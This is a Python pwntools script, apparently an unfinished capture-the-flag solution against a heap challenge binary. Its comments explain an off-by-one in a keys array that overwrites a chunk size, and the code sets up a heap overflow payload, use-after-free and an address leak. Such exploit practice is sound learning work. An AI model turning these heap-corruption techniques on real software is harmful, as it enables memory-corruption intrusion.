#!/usr/bin/python3
from pwn import *

'''
The keys array stores the size field 0x14 bytes after where it stores the address of each key.
The array is only meant to hold 10 keys, but they math'd wrong so we can add 11 keys.
The 11th key's address ends up overwriting the size of the first key (index 0)
This allows us to overflow the 0'th key. We could take advantage of this to create an unsafe unlink.

If I free one of the chunks, heap addresses will be written to it... could I then read those addresses
for a leak?

There's null bytes ahead of the address, but we could also use the overflow to write some stuff there so it keeps
reading up to the address of interest. This works but we need to use the content to read it since we can take
advantage of the use after free. The index is lost if we try to use keys.
'''

p = gdb.debug('./super_secure_heap_patched', '''
    c            
''')



def add_key(size):
    p.sendline('1') #keys
    p.sendline('1') #add
    p.sendline(str(size))

def add_content(size):
    p.sendline('2') #keys
    p.sendline('1') #add
    p.sendline(str(size))

def overflow_key_size():
    for x in range(10):
        add_key(32)

def free_content(chunk):
    p.sendline('2')
    p.sendline('2') #delete
    p.sendline(str(chunk))

def overflow_chunk_size():
    payload = b'A'*40 + p64(0x31) + b'B'*7 #leave room for new line

    p.sendline('1') #keys
    p.sendline('3') #modify
    p.sendline('0') #0th item
    p.sendline('100') #size
    p.sendline(payload)

def get_heap_leak():
    p.sendline('2') #content
    p.sendline('4') #show
    p.writeline('0') #index
    p.recvuntil(b'>')
    # dumpall output... weird behavior fix
    p.recv(timeout=0.1)
    data = p.recv(timeout=1)

    data = data.split(b'Here')[1]
    data = data.split(b'\n')[2]
    data = data.split(b'D')[0]
    return u64(data.ljust(8,b'\x00'))


add_key(32)
add_content(32)
overflow_key_size()
free_content(0)
add_key(100)
add_key(100)
#overflow_chunk_size()
#get_heap_leak()
p.interactive()